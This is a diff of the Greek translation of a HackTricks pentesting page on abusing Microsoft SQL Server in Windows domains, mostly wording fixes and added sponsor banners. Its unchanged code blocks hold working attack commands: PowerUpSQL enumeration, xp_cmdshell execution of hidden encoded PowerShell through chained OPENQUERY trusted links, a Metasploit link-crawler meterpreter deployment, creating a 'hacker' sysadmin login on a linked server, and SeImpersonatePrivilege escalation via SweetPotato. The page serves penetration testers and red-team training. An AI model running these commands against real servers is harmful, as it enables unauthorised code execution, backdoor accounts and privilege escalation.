@@ -4,13 +4,18 @@
 
 <summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
 
 ## **Απαρίθμηση / Ανακάλυψη MSSQL**
 
@@ -53,7 +58,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ## Βασική Κατάχρηση MSSQL
 
-### Πρόσβαση στη ΒΔ
+### Πρόσβαση στη Βάση Δεδομένων
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -72,17 +77,17 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-### Βασικά Κόλπα Χάκερικής για το MSSQL
+### Βασικά Κόλπα Χάκερ για το MSSQL
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## Εμπιστευμένοι Σύνδεσμοι MSSQL
+## Αξιόπιστοι Σύνδεσμοι MSSQL
 
-Εάν ένα παράδειγμα MSSQL είναι εμπιστευμένο (σύνδεσμος βάσης δεδομένων) από ένα διαφορετικό παράδειγμα MSSQL. Εάν ο χρήστης έχει προνόμια στην εμπιστευμένη βάση δεδομένων, θα μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στο άλλο παράδειγμα**. Αυτές οι εμπιστοσύνες μπορούν να αλυσιδωθούν και σε κάποιο σημείο ο χρήστης ενδέχεται να βρει μια κακοδιαμορφωμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.
+Εάν ένα παράδειγμα MSSQL είναι αξιόπιστο (σύνδεσμος βάσης δεδομένων) από ένα διαφορετικό παράδειγμα MSSQL. Εάν ο χρήστης έχει προνόμια στην αξιόπιστη βάση δεδομένων, θα μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στο άλλο παράδειγμα**. Αυτές οι εμπιστοσύνες μπορούν να αλυσιδωθούν και σε κάποιο σημείο ο χρήστης ενδέχεται να βρει μια κακοδιαμορφωμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.
 
-**Οι σύνδεσμοι μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και σε εμπιστοσύνες δάση.**
+**Οι σύνδεσμοι μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και σε εμπιστοσύνες δάσους.**
 
 ### Κατάχρηση Powershell
 ```powershell
@@ -124,22 +129,22 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-### Μη αυτόματο - Openquery()
+### Μη αυτόματη - Openquery()
 
 Από το **Linux** μπορείτε να αποκτήσετε ένα κέλυφος κονσόλας MSSQL με τα **sqsh** και **mssqlclient.py.**
 
-Από τα **Windows** μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **πελάτη MSSQL όπως το** [**HeidiSQL**](https://www.heidisql.com)
+Από τα **Windows** μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **MSSQL client όπως το** [**HeidiSQL**](https://www.heidisql.com)
 
 _Σύνδεση χρησιμοποιώντας ταυτοποίηση Windows:_
 
-![](<../../.gitbook/assets/image (167) (1).png>) 
+![](<../../.gitbook/assets/image (805).png>) 
 
 #### Εύρεση Αξιόπιστων Συνδέσμων
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../.gitbook/assets/image (168).png>)
+![](<../../.gitbook/assets/image (713).png>)
 
 #### Εκτέλεση ερωτημάτων σε αξιόπιστο σύνδεσμο
 
@@ -151,9 +156,9 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 Ελέγξτε πού χρησιμοποιούνται τα διπλά και μονά εισαγωγικά, είναι σημαντικό να χρησιμοποιούνται με αυτόν τον τρόπο.
 {% endhint %}
 
-![](<../../.gitbook/assets/image (169).png>)
+![](<../../.gitbook/assets/image (640).png>)
 
-Μπορείτε να συνεχίσετε αυτήν την αλυσίδα αξιόπιστων συνδέσεων επ' αόριστον χειροκίνητα.
+Μπορείτε να συνεχίσετε αυτήν την αλυσίδα αξιόπιστων συνδέσεων επ' άπειρον χειροκίνητα.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -169,10 +174,26 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Ανόρθωση Προνομίων Τοπικού Χρήστη
+## Ανόρθωση Προνομίων Τοπικά
 
 Ο **τοπικός χρήστης MSSQL** συνήθως έχει ένα ειδικό είδος προνομίου που ονομάζεται **`SeImpersonatePrivilege`**. Αυτό επιτρέπει στον λογαριασμό να "υποκαταστήσει έναν πελάτη μετά την πιστοποίηση".
 
 Μια στρατηγική που πολλοί συγγραφείς έχουν σκεφτεί είναι να αναγκάσουν ένα υπηρεσία SYSTEM να πιστοποιηθεί σε μια ψεύτικη ή man-in-the-middle υπηρεσία που δημιουργεί ο επιτιθέμενος. Αυτή η ψεύτικη υπηρεσία είναι σε θέση να υποκαταστήσει την υπηρεσία SYSTEM ενώ προσπαθεί να πιστοποιηθεί.
 
-Το [SweetPotato](https://github.com/CCob/SweetPotato) διαθέτει μια συλλογή αυτών των διαφόρων τεχνικών που μπορούν να εκτελεστούν μέσω της εντολής `execute-assembly` του Beacon.
+[SweetPotato](https://github.com/CCob/SweetPotato) διαθέτει μια συλλογή από αυτές τις διάφορες τεχνικές που μπορούν να εκτελεστούν μέσω της εντολής `execute-assembly` του Beacon.
+
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
+<details>
+
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+
+</details>
